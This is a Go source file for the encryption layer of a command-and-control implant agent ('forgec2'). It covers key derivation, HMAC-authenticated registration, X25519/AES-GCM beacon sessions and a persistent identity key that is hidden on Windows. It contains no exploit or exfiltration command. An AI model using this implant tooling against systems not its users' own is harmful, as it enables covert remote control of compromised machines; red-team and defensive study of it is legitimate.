package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdh"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"io"
	"os"
	"path/filepath"
	"runtime"
	"sync"
)

const (
	nonceSize  = 8
	keySize    = 32
	magicBytes = "FC20"

	// v2 key derivation salts — MUST mirror internal/crypto/keys.go.
	regKeySaltV2  = "forgec2-reg-v2"
	sessKeySaltV2 = "forgec2-session-v2"
)

var (
	errShortData    = errors.New("cipher data too short")
	errBadMagic     = errors.New("invalid magic bytes")
	errNoSessionKey = errors.New("ECDH session not established")
	errShortKey     = errors.New("stream cipher key must be 32 bytes")
)

// streamCipher is the legacy XOR stream cipher (backward compatible)
// Deprecated: Legacy XOR stream cipher provides no authentication.
// Use ECDH mode (CryptoKey="ecdh:") for AES-256-GCM authenticated encryption.
type streamCipher struct {
	key [keySize]byte
}

func newStreamCipher(key []byte) (*streamCipher, error) {
	if len(key) != keySize {
		return nil, errShortKey
	}
	c := &streamCipher{}
	copy(c.key[:], key)
	return c, nil
}

func (sc *streamCipher) encrypt(plaintext []byte) ([]byte, error) {
	nonce := make([]byte, nonceSize)
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}

	keystream := sc.generateKeystream(nonce, len(plaintext))
	ciphertext := make([]byte, 0, 4+nonceSize+len(plaintext))
	ciphertext = append(ciphertext, []byte(magicBytes)...)
	ciphertext = append(ciphertext, nonce...)
	for i, p := range plaintext {
		ciphertext = append(ciphertext, p^keystream[i])
	}
	return ciphertext, nil
}

func (sc *streamCipher) decrypt(data []byte) ([]byte, error) {
	if len(data) < 4+nonceSize {
		return nil, errShortData
	}
	if string(data[:4]) != magicBytes {
		return nil, errBadMagic
	}
	nonce := data[4 : 4+nonceSize]
	ciphertext := data[4+nonceSize:]

	keystream := sc.generateKeystream(nonce, len(ciphertext))
	plaintext := make([]byte, len(ciphertext))
	for i, c := range ciphertext {
		plaintext[i] = c ^ keystream[i]
	}
	return plaintext, nil
}

func (sc *streamCipher) generateKeystream(nonce []byte, length int) []byte {
	keystream := make([]byte, 0, length)
	counter := uint32(0)
	var counterBuf [4]byte
	h := sha256.New()
	for len(keystream) < length {
		h.Reset()
		h.Write(nonce)
		h.Write(sc.key[:])
		binary.LittleEndian.PutUint32(counterBuf[:], counter)
		h.Write(counterBuf[:])
		keystream = append(keystream, h.Sum(nil)...)
		counter++
	}
	return keystream[:length]
}

// --- v2 key derivation (standard-library HKDF-SHA256, mirrors internal/crypto) ---

// hkdfSHA256 implements HKDF-SHA256 using only the standard library so the
// agent (which must not depend on x/crypto in a standalone binary context)
// derives keys identically to the server.
func hkdfSHA256(secret, salt, info []byte) []byte {
	if len(secret) == 0 {
		return nil
	}
	extract := hmac.New(sha256.New, salt)
	extract.Write(secret)
	prk := extract.Sum(nil)

	out := make([]byte, 32)
	var prev []byte
	for counter := byte(1); len(prev) < len(out); counter++ {
		expand := hmac.New(sha256.New, prk)
		expand.Write(prev)
		expand.Write(info)
		expand.Write([]byte{counter})
		block := expand.Sum(nil)
		out = append(out[:0:0], out[:len(prev)]...)
		out = append(out, block[:len(out)-len(prev)]...)
		prev = block
	}
	return out
}

// deriveAgentRegKey derives the per-agent registration key from the compiled-in
// beacon key (hex string, same value as the server's cfg.Server.BeaconKey).
// Mirrors crypto.DeriveRegistrationKey. Returns nil for an empty/invalid key.
func deriveAgentRegKey(beaconKeyHex, agentID string) []byte {
	master, err := hex.DecodeString(beaconKeyHex)
	if err != nil || len(master) == 0 {
		return nil
	}
	return hkdfSHA256(master, []byte(regKeySaltV2), []byte(agentID))
}

// loadAgentRegKey returns the agent's registration key. v3: when a per-implant
// registration secret was compiled in (RegSecretStr), it is used directly — the
// fleet master beacon key is NOT present in the binary, so extracting it yields
// nothing about any other implant. v2 legacy: derived from the compiled-in
// master beacon key. Returns nil when neither is available.
func loadAgentRegKey() []byte {
	if RegSecretStr != "" {
		if secret, err := base64.StdEncoding.DecodeString(RegSecretStr); err == nil && len(secret) == 32 {
			return secret
		}
	}
	return deriveAgentRegKey(beaconKey, agentUUID)
}

// deriveAgentSessionKey derives the AES-256-GCM session key from an X25519
// shared secret. Mirrors crypto.DeriveSessionKey.
func deriveAgentSessionKey(sharedSecret []byte, agentID string) []byte {
	return hkdfSHA256(sharedSecret, []byte(sessKeySaltV2), []byte(agentID))
}

// computeRegHMAC authenticates the v2 registration frame:
// HMAC-SHA256(regKey, agentID || identity_pub_b64 || ts (8-byte big-endian)).
// Mirrors crypto.ComputeRegHMAC.
func computeRegHMAC(regKey []byte, agentID, identityPubB64 string, ts int64) []byte {
	mac := hmac.New(sha256.New, regKey)
	mac.Write([]byte(agentID))
	mac.Write([]byte(identityPubB64))
	var buf [8]byte
	for i := 0; i < 8; i++ {
		buf[7-i] = byte(ts >> (8 * i))
	}
	mac.Write(buf[:])
	return mac.Sum(nil)
}

// computeFrameMAC authenticates v2 handshake request frames and the server's
// auth responses: HMAC-SHA256(regKey, parts...). Mirrors server computeAuthMAC.
func computeFrameMAC(regKey []byte, parts ...string) []byte {
	mac := hmac.New(sha256.New, regKey)
	for _, p := range parts {
		mac.Write([]byte(p))
	}
	return mac.Sum(nil)
}

// --- v2 identity key (persistent X25519 pair, bound at registration) ---

var identityPriv *ecdh.PrivateKey // persistent identity key (nil until loaded)

// loadOrCreateIdentityKey loads the persistent identity key, generating and
// persisting a fresh one on first run. Returns (key, firstRun).
func loadOrCreateIdentityKey() (*ecdh.PrivateKey, bool) {
	path := getIdentityKeyFilePath()
	if data, err := os.ReadFile(path); err == nil && len(data) == 32 {
		if k, err := ecdh.X25519().NewPrivateKey(data); err == nil {
			identityPriv = k
			return k, false
		}
	}
	curve := ecdh.X25519()
	k, err := curve.GenerateKey(rand.Reader)
	if err != nil {
		return nil, false
	}
	if err := os.WriteFile(path, k.Bytes(), 0600); err != nil {
		return nil, false
	}
	if runtime.GOOS == "windows" {
		setHidden(path)
	}
	identityPriv = k
	return k, true
}

// identityPubB64 returns the identity public key (base64) or "" if not loaded.
func identityPubB64() string {
	if identityPriv == nil {
		return ""
	}
	return base64.StdEncoding.EncodeToString(identityPriv.PublicKey().Bytes())
}

// getIdentityKeyFilePath returns the persistence path for the identity key.
func getIdentityKeyFilePath() string {
	dir := filepath.Dir(getUUIDFilePath())
	return filepath.Join(dir, "identity.key")
}

// --- ECDH + AES-256-GCM Session (forward-secret encryption) ---

// ecdhSession manages a single ECDH session with the server. It is shared by
// the beacon loop, quick-result senders and task executor goroutines, so every
// access to privateKey/sessionKey is guarded by mu.
type ecdhSession struct {
	mu         sync.RWMutex
	privateKey *ecdh.PrivateKey
	sessionKey []byte // AES-256-GCM key derived from ECDH shared secret
}

// newECDSession generates a new ECDH key pair for session initiation
func newECDSession() (*ecdhSession, error) {
	curve := ecdh.X25519()
	privateKey, err := curve.GenerateKey(rand.Reader)
	if err != nil {
		return nil, err
	}
	return &ecdhSession{
		privateKey: privateKey,
	}, nil
}

// publicKeyB64 returns the base64-encoded public key for the handshake
func (es *ecdhSession) publicKeyB64() string {
	es.mu.RLock()
	defer es.mu.RUnlock()
	return base64.StdEncoding.EncodeToString(es.privateKey.PublicKey().Bytes())
}

// establishFromServerKey completes the ECDH handshake using the server's public
// key. The session key is HKDF-derived from the shared secret, bound to the
// agent identity (v2 — replaces the bare SHA-256 of v1).
func (es *ecdhSession) establishFromServerKey(serverPubB64 string) error {
	curve := ecdh.X25519()
	serverPub, err := curve.NewPublicKey(decodeB64(serverPubB64))
	if err != nil {
		return err
	}
	es.mu.Lock()
	defer es.mu.Unlock()
	sharedSecret, err := es.privateKey.ECDH(serverPub)
	if err != nil {
		return err
	}
	es.sessionKey = deriveAgentSessionKey(sharedSecret, agentUUID)
	return nil
}

// invalidate drops the session key so the next beacon performs a fresh
// authenticated handshake (rekey / server restart recovery).
func (es *ecdhSession) invalidate() {
	es.mu.Lock()
	es.sessionKey = nil
	es.mu.Unlock()
}

// encryptAESGCM encrypts plaintext with AES-256-GCM using the session key.
// AAD binds the frame to its agent/sequence (v2 replay protection).
// Returns: base64(nonce + ciphertext)
func (es *ecdhSession) encryptAESGCMWithAAD(plaintext []byte, aad []byte) (string, error) {
	es.mu.RLock()
	defer es.mu.RUnlock()
	if es.sessionKey == nil {
		return "", errNoSessionKey
	}

	block, err := aes.NewCipher(es.sessionKey)
	if err != nil {
		return "", err
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	nonce := make([]byte, aesGCM.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return "", err
	}

	ciphertext := aesGCM.Seal(nonce, nonce, plaintext, aad)

	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

// decryptAESGCMWithAAD decrypts base64(nonce + ciphertext) with AES-256-GCM,
// authenticating the same AAD used at encryption time.
func (es *ecdhSession) decryptAESGCMWithAAD(encoded string, aad []byte) ([]byte, error) {
	es.mu.RLock()
	defer es.mu.RUnlock()
	if es.sessionKey == nil {
		return nil, errNoSessionKey
	}

	data, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return nil, err
	}

	block, err := aes.NewCipher(es.sessionKey)
	if err != nil {
		return nil, err
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonceSize := aesGCM.NonceSize()
	if len(data) < nonceSize {
		return nil, errShortData
	}

	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := aesGCM.Open(nil, nonce, ciphertext, aad)
	if err != nil {
		return nil, err
	}

	return plaintext, nil
}

// needsHandshake returns true if the session hasn't been established yet
func (es *ecdhSession) needsHandshake() bool {
	es.mu.RLock()
	defer es.mu.RUnlock()
	return es.sessionKey == nil
}

func decodeB64(s string) []byte {
	data, err := base64.StdEncoding.DecodeString(s)
	if err != nil {
		return nil
	}
	return data
}
